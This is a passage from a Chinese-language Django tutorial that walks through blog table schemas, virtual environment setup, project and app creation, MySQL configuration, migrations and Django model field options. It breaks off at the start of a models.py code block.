<li>图片存储 ：博文就像HTML一样，图片是通过 <b>路径信息</b> 将图片是嵌入在内容中的，所以保存的内容还是字符串。图片来源有2中：
<ul class="org-ul">
<li>外联：通过URL链接访问，本站不用存储该图片，但容易引起盗链问题。</li>
<li>本站存储：需要提供博文的在线文本编辑器，提供图片上传到网站存储，并生成图片URL，这个URL嵌入博客正文中，不会有盗链问题，但要解决众多图片存储问题、水印问题、在线压缩问题、临时或垃圾图片清理等等难题。</li>
<li>本博客项目不实现图片功能</li>
</ul></li>
<li>字段考虑
<ul class="org-ul">
<li>content字段存储文本类型大字段，一般不和数据频繁查询的字段放在一张表中，需要拆到另一张表中。</li>
</ul></li>
</ol>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">CREATE</span> <span style="color: #a020f0;">TABLE</span> `post` (
    `id` BIGINT ( 20 ) UNSIGNED <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span> AUTO_INCREMENT,
    `title` <span style="color: #228b22;">VARCHAR</span> ( 256 ) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    `author_id` <span style="color: #228b22;">INT</span> ( 11 ) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    `postdate` datetime <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    <span style="color: #a020f0;">PRIMARY</span> <span style="color: #a020f0;">KEY</span> ( `id` ),
    <span style="color: #a020f0;">KEY</span> `author_id` ( `author_id` ),
<span style="color: #a020f0;">CONSTRAINT</span> `fk_post_user` <span style="color: #a020f0;">FOREIGN</span> <span style="color: #a020f0;">KEY</span> ( `author_id` ) <span style="color: #a020f0;">REFERENCES</span> `<span style="color: #483d8b;">user</span>` ( `id` ) 
) ENGINE = INNODB <span style="color: #a020f0;">DEFAULT</span> CHARSET = utf8;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">CREATE</span> <span style="color: #a020f0;">TABLE</span> `content` (
    `id` BIGINT ( 20 ) UNSIGNED <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    `content` text <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
    <span style="color: #a020f0;">PRIMARY</span> <span style="color: #a020f0;">KEY</span> ( `id` ) <span style="color: #a020f0;">USING</span> BTREE,
<span style="color: #a020f0;">CONSTRAINT</span> `fk_content_post` <span style="color: #a020f0;">FOREIGN</span> <span style="color: #a020f0;">KEY</span> ( `id` ) <span style="color: #a020f0;">REFERENCES</span> `post` ( `id` ) 
) ENGINE = INNODB <span style="color: #a020f0;">DEFAULT</span> CHARSET = utf8;
</pre>
</div>

<p>
注：这里的SQL脚本本次不要用来生成表，使用ORM库写代码来创建表，用来检查实体类构建是否正确。
</p>

<p>
用户完成的功能有登录、注册、登出等，auth_user表基本满足。
</p>

<p>
博客功能有用户发文、文章列表、文章详情等，post、content表基本满足。
</p>
</div>
</div>
</div>
<div id="outline-container-h:60240dfa-b819-4e1c-921b-5d14367c8ece" class="outline-3">
<h3 id="h:60240dfa-b819-4e1c-921b-5d14367c8ece">项目</h3>
<div class="outline-text-3" id="text-h:60240dfa-b819-4e1c-921b-5d14367c8ece">
</div>
<div id="outline-container-h:65093d73-c03a-4d8e-8167-c79088270fa8" class="outline-4">
<h4 id="h:65093d73-c03a-4d8e-8167-c79088270fa8">项目构建</h4>
<div class="outline-text-4" id="text-h:65093d73-c03a-4d8e-8167-c79088270fa8">
<ul class="org-ul">
<li>在Pycharm中创建一个项目，使用虚拟环境，Python使用版本是3.13.3</li>

<li>使用虚拟环境，Python挑选喜欢的版本(本次选用3.13.3)</li>

<li>注：Pycharm中可通过setting重新设置虚拟环境。</li>

<li>本次项目使用Django开发后台。</li>
</ul>
</div>
</div>
</div>
</section>
<section id="outline-container-h:0fb0d61d-ad66-4c23-b1f7-ed66a2cb0bc7" class="outline-2">
<h2 id="h:0fb0d61d-ad66-4c23-b1f7-ed66a2cb0bc7">项目构建和基础知识</h2>
<div class="outline-text-2" id="text-h:0fb0d61d-ad66-4c23-b1f7-ed66a2cb0bc7">
</div>
<div id="outline-container-h:908b8308-a395-409d-ab96-9173d083d9e6" class="outline-3">
<h3 id="h:908b8308-a395-409d-ab96-9173d083d9e6">概述</h3>
<div class="outline-text-3" id="text-h:908b8308-a395-409d-ab96-9173d083d9e6">
<p>
Django采用MVC架构设计的开源的WEB快速开发框架。
</p>

<p>
优点：
</p>
<ol class="org-ol">
<li>MVC设计模式</li>
<li>能够快速开发，自带ORM、Template、Form、Auth核心组件</li>
<li>简洁的url设计</li>
<li>实用的管理后台Admin</li>
<li>周边插件丰富</li>
</ol>

<p>
缺点：架构重、同步阻塞
</p>

<p>
所有Django的设计目标就是一款大而全，便于企业快速开发项目的框架，因此企业应用较广。
</p>
</div>
</div>
<div id="outline-container-h:2e4923df-6bf2-4eaa-ab09-8ad8c84b3982" class="outline-3">
<h3 id="h:2e4923df-6bf2-4eaa-ab09-8ad8c84b3982">安装Django</h3>
<div class="outline-text-3" id="text-h:2e4923df-6bf2-4eaa-ab09-8ad8c84b3982">
<ul class="org-ul">
<li>Python实用3.13.3</li>
<li>Python虚拟环境：<a href="https://docs.python.org/zh-cn/3.13/library/venv.html">https://docs.python.org/zh-cn/3.13/library/venv.html</a></li>
<li>Django的下载地址<a href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></li>
<li>Django文档：<a href="https://docs.djangoproject.com/">https://docs.djangoproject.com/</a></li>
</ul>

<p>
Python版本依赖，<a href="https://docs.djangoproject.com/en/5.2/faq/install/#what-python-version-can-i-use-with-django">参看</a>
</p>
<table>


<colgroup>
<col  class="org-right">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">Django version</th>
<th scope="col" class="org-left">Python versions</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">4.2</td>
<td class="org-left">3.8, 3.9, 3.10, 3.11, 3.12 (added in 4.2.8)</td>
</tr>

<tr>
<td class="org-right">5.0</td>
<td class="org-left">3.10, 3.11, 3.12</td>
</tr>

<tr>
<td class="org-right">5.1</td>
<td class="org-left">3.10, 3.11, 3.12, 3.13 (added in 5.1.3)</td>
</tr>

<tr>
<td class="org-right">5.2</td>
<td class="org-left">3.10, 3.11, 3.12, 3.13</td>
</tr>
</tbody>
</table>

<div class="org-src-container">
<pre class="src src-sh">mkdir blog10
<span style="color: #483d8b;">cd</span> blog10

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;python&#34394;&#25311;&#29615;&#22659;, &#24182;&#21551;&#21160;</span>
python -m venv .venv
<span style="color: #483d8b;">.</span><span style="color: #8b2252;">\.</span>venv\Scripts\activate

&#22791;&#27880; &#22312; Microsoft Windows &#19978;&#65292;&#20026;&#20102;&#21551;&#29992; Activate.ps1 &#33050;&#26412;&#65292;&#21487;&#33021;&#38656;&#35201;&#20462;&#25913;&#29992;&#25143;&#30340;&#25191;&#34892;&#31574;&#30053;&#12290;&#21487;&#20197;&#36816;&#34892;&#20197;&#19979; PowerShell &#21629;&#20196;&#26469;&#25191;&#34892;&#27492;&#25805;&#20316;&#65306;
PS C:<span style="color: #8b2252;">\&gt;</span> Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
.venv\Scripts\Activate.ps1

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22312;&#34394;&#25311;&#29615;&#22659;&#20013;&#23433;&#35013;</span>
python -m pip install <span style="color: #a0522d;">Django</span>==5.2.4
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">django-admin --version <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#24403;&#21069;django&#29256;&#26412;</span>
django-admin --help <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#20351;&#29992;&#24110;&#21161;</span>
django-admin startproject --help <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;startproject&#21629;&#20196;&#24110;&#21161;</span>
</pre>
</div>

<p>
注意：本文若未特殊声明，所有的命令操作都在项目的根目录下
</p>
</div>
</div>
<div id="outline-container-h:c32e2da5-2cb1-4365-af22-bd6309746a7a" class="outline-3">
<h3 id="h:c32e2da5-2cb1-4365-af22-bd6309746a7a">创建Django项目</h3>
<div class="outline-text-3" id="text-h:c32e2da5-2cb1-4365-af22-bd6309746a7a">
<p>
当前目录下，创建名为blog的django项目
</p>

<div class="org-src-container">
<pre class="src src-sh">django-admin startproject blog .
</pre>
</div>

<p>
上句命令就在当前项目根目录中构建了Django项目的初始文件。 <code>.</code> 点代表项目根目录。
</p>

<div class="org-src-container">
<pre class="src src-text">D:\PROJECT\PYPROJS\TRAE\BLOG10\USER
&#9500;&#9472; manage.py
 &#9492;&#9472; blog
     &#9500;&#9472;  settings.py
     &#9500;&#9472;  urls.py  #&#36335;&#24452;&#26144;&#23556;
     &#9500;&#9472;  wsgi.py
     &#9500;&#9472;  asgi.py
     &#9492;&#9472;  __init__.py
</pre>
</div>

<p>
重要文件说明
</p>
<ol class="org-ol">
<li>manage.py: 本项目管理的命令行工具。应用创建、数据库迁移等都使用它完成</li>
<li><b>blog/settings.py</b>: 本项目的核心配置文件。
<ul class="org-ul">
<li>应用、数据库配置</li>
<li>模板、静态文件</li>
<li>中间件、日志</li>
<li>第三方插件配置</li>
</ul></li>
<li><b>blog/urls.py</b>: URL路径映射配置。项目初始，只配置了/admin的路由。</li>
<li>blog/wsgi:定义WSGI接口信息。部署用，一般无需改动。
<ul class="org-ul">
<li><code>return WSGIHandler()</code>
<ul class="org-ul">
<li><code>__call__(self, environ, start_response)</code></li>
</ul></li>
</ul></li>
</ol>


<p>
主路由文件url.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
]
</pre>
</div>
</div>
<div id="outline-container-h:1e90c990-0549-41f0-b9ba-6796476ea00f" class="outline-4">
<h4 id="h:1e90c990-0549-41f0-b9ba-6796476ea00f">数据库配置</h4>
<div class="outline-text-4" id="text-h:1e90c990-0549-41f0-b9ba-6796476ea00f">
<p>
使用数据库，需要修改默认的数据库配置。
</p>

<p>
在主项目的settings.py下DATABASES。默认使用的sqlite，修改为mysql。
</p>

<p>
<a href="https://docs.djangoproject.com/en/5.2/ref/settings/#databases">https://docs.djangoproject.com/en/5.2/ref/settings/#databases</a>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">DATABASES</span> = {
    <span style="color: #8b2252;">'default'</span>: {
        <span style="color: #8b2252;">'ENGINE'</span>: <span style="color: #8b2252;">'django.db.backends.mysql'</span>,
        <span style="color: #8b2252;">'NAME'</span>: <span style="color: #8b2252;">'blog'</span>,
        <span style="color: #8b2252;">'USER'</span>: <span style="color: #8b2252;">'root'</span>,
        <span style="color: #8b2252;">'PASSWORD'</span>: <span style="color: #8b2252;">'123456'</span>,
        <span style="color: #8b2252;">'HOST'</span>: <span style="color: #8b2252;">'10.0.0.152'</span>,
        <span style="color: #8b2252;">'PORT'</span>: <span style="color: #8b2252;">'3306'</span>,
    }
}
</pre>
</div>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">配置项</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">HOST</td>
<td class="org-left">数据库主机。缺省是空字符串，代表localhost。如果是=/=开头表示使用UnixSocket链接</td>
</tr>

<tr>
<td class="org-left">POST</td>
<td class="org-left">端口</td>
</tr>

<tr>
<td class="org-left">USER</td>
<td class="org-left">用户名</td>
</tr>

<tr>
<td class="org-left">PASSWORD</td>
<td class="org-left">密码</td>
</tr>

<tr>
<td class="org-left">NAME</td>
<td class="org-left">库名</td>
</tr>

<tr>
<td class="org-left">OPTIONS</td>
<td class="org-left">选项、字典类型，参考MySQL文档</td>
</tr>
</tbody>
</table>

<ol class="org-ol">
<li>数据库引擎ENGINE</li>
<li>内建引擎有
<ul class="org-ul">
<li>django.db.backends.postgresql</li>
<li>django.db.backends.mysql</li>
<li>django.db.backends.sqlite3</li>
<li>django.db.backends.oracle</li>
</ul></li>
</ol>
</div>
</div>
<div id="outline-container-h:0674244f-e898-4721-86d0-e9958c061d55" class="outline-4">
<h4 id="h:0674244f-e898-4721-86d0-e9958c061d55">MySQL数据库驱动</h4>
<div class="outline-text-4" id="text-h:0674244f-e898-4721-86d0-e9958c061d55">
<p>
<a href="https://docs.djangoproject.com/en/5.2/ref/databases/#mysql-db-api-drivers">https://docs.djangoproject.com/en/5.2/ref/databases/#mysql-db-api-drivers</a>
</p>

<p>
Django支持MySQL8+
</p>

<p>
Django官方推荐使用本地驱动mysqlclient 1.4.3+
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#23433;&#35013;mysql&#39537;&#21160;</span>
pip install mysqlclient
</pre>
</div>

<p>
Linux、Mac请参照官网安装依赖库  
</p>
<ul class="org-ul">
<li><a href="https://pypi.org/project/mysqlclient/">https://pypi.org/project/mysqlclient/</a></li>
</ul>
</div>
</div>
<div id="outline-container-h:fc5a4e84-c7bb-45e6-ad43-7a2e24b996ee" class="outline-4">
<h4 id="h:fc5a4e84-c7bb-45e6-ad43-7a2e24b996ee">创建应用</h4>
<div class="outline-text-4" id="text-h:fc5a4e84-c7bb-45e6-ad43-7a2e24b996ee">
<p>
创建用户应用
</p>
<div class="org-src-container">
<pre class="src src-sh">python manage.py startapp user
</pre>
</div>

<p>
创建应用后，项目根目录下产生一个user目录，有如下文件：
</p>
<ol class="org-ol">
<li>admin.py: 应用后台管理声明文件</li>
<li><b>models.py</b>: 模型层Model类定义</li>
<li><b>views.py</b>: 定义URL响应函数或类</li>
<li>migrations包: 数据迁移文件生成目录</li>
<li>apps.py: 应用的信息定义文件</li>
</ol>

<div class="org-src-container">
<pre class="src src-sh">D:\PROJECT\PYPROJS\TRAE\BLOG10\USER
&#9474;  admin.py    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24212;&#29992;&#21518;&#21488;&#31649;&#29702;&#22768;&#26126;&#25991;&#20214;</span>
&#9474;  apps.py     <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24212;&#29992;&#30340;&#20449;&#24687;&#23450;&#20041;&#25991;&#20214;</span>
&#9474;  models.py   <span style="color: #b22222;"># </span><span style="color: #b22222;">&#27169;&#22411;&#23618;Model&#31867;&#23450;&#20041;</span>
&#9474;  tests.py
&#9474;  views.py    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#23450;&#20041;URL&#21709;&#24212;&#20989;&#25968;&#25110;&#31867;</span>
&#9474;  __init__.py
&#9474;
&#9492;&#9472;migrations   <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#36801;&#31227;&#25991;&#20214;&#29983;&#25104;&#30446;&#24405;</span>
        __init__.py
</pre>
</div>

<p>
user应用创建后应该完成以下功能：
</p>
<ol class="org-ol">
<li>用户注册</li>
<li>用户登录</li>
</ol>
</div>
</div>
<div id="outline-container-h:ca220398-f7b9-40b5-97ee-547eb88277b8" class="outline-4">
<h4 id="h:ca220398-f7b9-40b5-97ee-547eb88277b8">注册应用</h4>
<div class="outline-text-4" id="text-h:ca220398-f7b9-40b5-97ee-547eb88277b8">
<p>
在settings.py中，增加user应用。目的是为了 <b>后台管理</b> admin使用，或 <b>迁移</b> migrate使用
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">settings.py&#25991;&#20214;&#20013;</span>
<span style="color: #a0522d;">INSTALLED_APPS</span> = [
    <span style="color: #8b2252;">'django.contrib.admin'</span>,
    <span style="color: #8b2252;">'django.contrib.auth'</span>,
    <span style="color: #8b2252;">'django.contrib.contenttypes'</span>,
    <span style="color: #8b2252;">'django.contrib.sessions'</span>,
    <span style="color: #8b2252;">'django.contrib.messages'</span>,
    <span style="color: #8b2252;">'django.contrib.staticfiles'</span>,
    <span style="color: #8b2252;">'user'</span>,
]
</pre>
</div>

<p>
本次user应用使用内建的表auth_user，所以不用注册user表。删除post表外键和user表。
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">ALTER</span> <span style="color: #a020f0;">TABLE</span> `blog`.`post` <span style="color: #a020f0;">DROP</span> <span style="color: #a020f0;">FOREIGN</span> <span style="color: #a020f0;">KEY</span> `fk_post_user`
<span style="color: #a020f0;">DROP</span> <span style="color: #a020f0;">TABLE</span> <span style="color: #0000ff;">IF</span> <span style="color: #a020f0;">EXISTS</span> `blog`.`<span style="color: #483d8b;">user</span>`;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:be1c93a4-b01e-47ad-a603-ce4d104a5d22" class="outline-4">
<h4 id="h:be1c93a4-b01e-47ad-a603-ce4d104a5d22">迁移</h4>
<div class="outline-text-4" id="text-h:be1c93a4-b01e-47ad-a603-ce4d104a5d22">
<p>
Django内部也有应用，它们需要表。这些表的迁移文件已经生成了，只需要迁移。
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">python manage.py makemigrations #&#21487;&#20197;&#20570;&#65292;&#20294;&#20570;&#20102;&#20063;&#30333;&#20570;&#12290;user &#19979;&#38754;&#36824;&#27809;&#26377;modes&#31867;&#12290;INSTALLED_APPS&#20013;user&#19978;&#38754;&#30340;&#31867;django&#24050;&#32463;&#20889;&#22909;&#20102;</span>
python manage.py migrate
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">(.venv) PS D:\project\pyprojs\trae\blog10&gt; python manage.py makemigrations
No changes detected
(.venv) PS D:\project\pyprojs\trae\blog10&gt; python manage.py migrate
Operations to perform:
  Apply all migrations: admin, auth, contenttypes, sessions
Running migrations:
  Applying contenttypes.0001_initial... OK
  Applying auth.0001_initial... OK
  Applying admin.0001_initial... OK
  Applying admin.0002_logentry_remove_auto_add... OK
  Applying admin.0003_logentry_add_action_flag_choices... OK
  Applying contenttypes.0002_remove_content_type_name... OK
  Applying auth.0002_alter_permission_name_max_length... OK
  Applying auth.0003_alter_user_email_max_length... OK
  Applying auth.0004_alter_user_username_opts... OK
  Applying auth.0005_alter_user_last_login_null... OK
  Applying auth.0006_require_contenttypes_0002... OK
  Applying auth.0007_alter_validators_add_error_messages... OK
  Applying auth.0008_alter_user_username_max_length... OK
  Applying auth.0009_alter_user_last_name_max_length... OK
  Applying auth.0010_alter_group_name_max_length... OK
  Applying auth.0011_update_proxy_permissions... OK
  Applying auth.0012_alter_user_first_name_max_length... OK
  Applying sessions.0001_initial... OK
</pre>
</div>

<p>
迁移后，产生下面这些表：
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; show tables ;
+----------------------------+
| Tables_in_blog             |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| content                    |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
| post                       |
+----------------------------+
</pre>
</div>

<p>
创建post表指向auth_user表的外键
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">ALTER</span> <span style="color: #a020f0;">TABLE</span> `blog`.`post` 
<span style="color: #a020f0;">ADD</span> <span style="color: #a020f0;">CONSTRAINT</span> `post_ibfk_1` <span style="color: #a020f0;">FOREIGN</span> <span style="color: #a020f0;">KEY</span> (`author_id`) <span style="color: #a020f0;">REFERENCES</span> `blog`.`auth_user` (`id`);
</pre>
</div>

<p>
auth_user表结构
</p>
<div class="org-src-container">
<pre class="src src-sql"><span style="color: #a020f0;">CREATE</span> <span style="color: #a020f0;">TABLE</span> `blog`.`auth_user`  (
  `id` <span style="color: #228b22;">int</span> <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span> AUTO_INCREMENT,
  `password` <span style="color: #228b22;">varchar</span>(128) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `last_login` datetime(6) <span style="color: #a020f0;">NULL</span> <span style="color: #a020f0;">DEFAULT</span> <span style="color: #a020f0;">NULL</span>,
  `is_superuser` tinyint(1) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `username` <span style="color: #228b22;">varchar</span>(150) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `first_name` <span style="color: #228b22;">varchar</span>(150) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `last_name` <span style="color: #228b22;">varchar</span>(150) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `email` <span style="color: #228b22;">varchar</span>(254) <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> utf8mb4 <span style="color: #a020f0;">COLLATE</span> utf8mb4_0900_ai_ci <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `is_staff` tinyint(1) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `is_active` tinyint(1) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  `date_joined` datetime(6) <span style="color: #a020f0;">NOT</span> <span style="color: #a020f0;">NULL</span>,
  <span style="color: #a020f0;">PRIMARY</span> <span style="color: #a020f0;">KEY</span> (`id`) <span style="color: #a020f0;">USING</span> BTREE,
  <span style="color: #a020f0;">UNIQUE</span> INDEX `username`(`username` <span style="color: #a020f0;">ASC</span>) <span style="color: #a020f0;">USING</span> BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 <span style="color: #228b22;">CHARACTER</span> <span style="color: #a020f0;">SET</span> = utf8mb4 <span style="color: #a020f0;">COLLATE</span> = utf8mb4_0900_ai_ci ROW_FORMAT = <span style="color: #a020f0;">Dynamic</span>;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:976fe8a4-d5dc-4d5f-8662-6b9f0feb7313" class="outline-3">
<h3 id="h:976fe8a4-d5dc-4d5f-8662-6b9f0feb7313">如果使用自建use表</h3>
<div class="outline-text-3" id="text-h:976fe8a4-d5dc-4d5f-8662-6b9f0feb7313">
</div>
<div id="outline-container-h:deca07ae-0a55-4089-b766-d6a50e12a47d" class="outline-4">
<h4 id="h:deca07ae-0a55-4089-b766-d6a50e12a47d">模型Model</h4>
<div class="outline-text-4" id="text-h:deca07ae-0a55-4089-b766-d6a50e12a47d">
<ul class="org-ul">
<li><b>字段类型</b></li>
</ul>

<p>
<a href="https://docs.djangoproject.com/zh-hans/5.1/ref/models/fields/#field-options">官方文档</a>
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">字段类</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">AutoField</td>
<td class="org-left">自增的整数字段。如果不指定，django会为模型类自动增加主键字段</td>
</tr>

<tr>
<td class="org-left">BooleanField</td>
<td class="org-left">布尔值字段，True和False。对应表单控件CheckboxInput</td>
</tr>

<tr>
<td class="org-left">NullBooleanField</td>
<td class="org-left">比BooleanField多一个null值</td>
</tr>

<tr>
<td class="org-left">CharField</td>
<td class="org-left">字符串，max_length设定字符长度。对应表单控件TextInput</td>
</tr>

<tr>
<td class="org-left">TextField</td>
<td class="org-left">大文本字段，一般超过4000个字符使用。对应表单控件Textarea</td>
</tr>

<tr>
<td class="org-left">IntegerField</td>
<td class="org-left">整数字段, 一般4字节</td>
</tr>

<tr>
<td class="org-left">BigIntegerField</td>
<td class="org-left">更大整数字段，8字节</td>
</tr>

<tr>
<td class="org-left">DecimalField</td>
<td class="org-left">使用Python的Decimal实例表示十进制浮点数。max_digits总位数，decimal_places小数点后的位数</td>
</tr>

<tr>
<td class="org-left">FloatField</td>
<td class="org-left">Python的Float实例表示的浮点数</td>
</tr>

<tr>
<td class="org-left">DateField</td>
<td class="org-left">使用Python的datetime.date实例表示的日期</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">auto_now=False每次修改对象自动设置为当前时间。</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">auto_now_add=False对象第一次创建时自动设置为当前时间。</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">auto_now_add、auto_now、default互斥。</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">对应控件为TextInput，关联了一个Js编写的日历控件</td>
</tr>

<tr>
<td class="org-left">TimeField</td>
<td class="org-left">使用Python的datetime.time实例表示的时间，参数同上</td>
</tr>

<tr>
<td class="org-left">DateTimeField</td>
<td class="org-left">使用Python的datetime.datetime实例表示的时间，参数同上</td>
</tr>

<tr>
<td class="org-left">FileField</td>
<td class="org-left">一个上传文件的字段</td>
</tr>

<tr>
<td class="org-left">ImageField</td>
<td class="org-left">继承了FileField的所有属性和方法，但是对上传的文件进行校验，确保是一个有效的图片</td>
</tr>

<tr>
<td class="org-left">EmailField</td>
<td class="org-left">能做Email检验，基于CharField，默认max_length=254</td>
</tr>

<tr>
<td class="org-left">GenericIPAddressField</td>
<td class="org-left">支持IPv4、IPv6检验，缺省对应文本框输入</td>
</tr>

<tr>
<td class="org-left">URLField</td>
<td class="org-left">能做URL检验，基于基于CharField，默认max_length=200</td>
</tr>
</tbody>
</table>


<ul class="org-ul">
<li><b>缺省主键</b>
<ol class="org-ol">
<li>缺省情况下，Django的每一个Model都有一个名为id的AutoField字段，如下
<ul class="org-ul">
<li><code>id = models.AutoField(primary_key=True)</code></li>
</ul></li>
<li>如果显示定义了主键，这种缺省主键就不会被创建了。Python之禅中说“显示优于隐试”，所以，尽量使用自己定义的主键，哪怕该字段名就是id，也是一种不错的选择。</li>
</ol></li>
<li><b>字段选项</b></li>
</ul>

<p>
<a href="https://docs.djangoproject.com/zh-hans/5.1/ref/models/fields/#field-options">官方文档</a>
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">值</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">db_column</td>
<td class="org-left">表中字段的名称。如果未指定，则使用属性名</td>
</tr>

<tr>
<td class="org-left">primary_key</td>
<td class="org-left">是否主键</td>
</tr>

<tr>
<td class="org-left">unique</td>
<td class="org-left">是否是唯一键</td>
</tr>

<tr>
<td class="org-left">default</td>
<td class="org-left">缺省值。这个缺省值不是数据库字段的缺省值，而是新对象产生的时候被填入的缺省值</td>
</tr>

<tr>
<td class="org-left">null</td>
<td class="org-left">表的字段是否可为null，默认为False</td>
</tr>

<tr>
<td class="org-left">blank</td>
<td class="org-left">Django表单验证中，如果True，则允许该字段为空。默认为False</td>
</tr>

<tr>
<td class="org-left">db_index</td>
<td class="org-left">字段是否有索引</td>
</tr>

<tr>
<td class="org-left">to_field</td>
<td class="org-left">关联对象的字段。默认情况下，Django 使用相关对象的主键。如果你引用了一个不同的字段，这个字段必须有 unique=True</td>
</tr>
</tbody>
</table>

<p>
关系类型字段类
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">类</th>
<th scope="col" class="org-left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">ForeignKey</td>
<td class="org-left">外键，表示一对多</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">ForeignKey('production.Manufacturer')</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">自关联ForeignKey('self')</td>
</tr>

<tr>
<td class="org-left">ManyToManyField</td>
<td class="org-left">表示多对多</td>
</tr>

<tr>
<td class="org-left">OneToOneField</td>
<td class="org-left">表示一对一</td>
</tr>
</tbody>
</table>

<p>
一对多时，自动创建会增加_id后缀。
</p>
<ul class="org-ul">
<li>从一访问多，使用 <code>对象.小写模型类_set</code></li>
<li>从一访问一，使用 <code>对象.小写模型类</code></li>
</ul>

<p>
访问id <code>对象.属性_id</code>
</p>
</div>
</div>
<div id="outline-container-h:b3cf9f14-2314-4ca6-b8e7-c040f7a68703" class="outline-4">
<h4 id="h:b3cf9f14-2314-4ca6-b8e7-c040f7a68703">创建User的Model类</h4>
<div class="outline-text-4" id="text-h:b3cf9f14-2314-4ca6-b8e7-c040f7a68703">
<ul class="org-ul">
<li>基类models.Model</li>
<li>表名不指定默认使用 <code>&lt;appname&gt;_&lt;model_name&gt;</code> 。使用Meta类修改表名</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">/user/models.py&#25991;&#20214;</span>
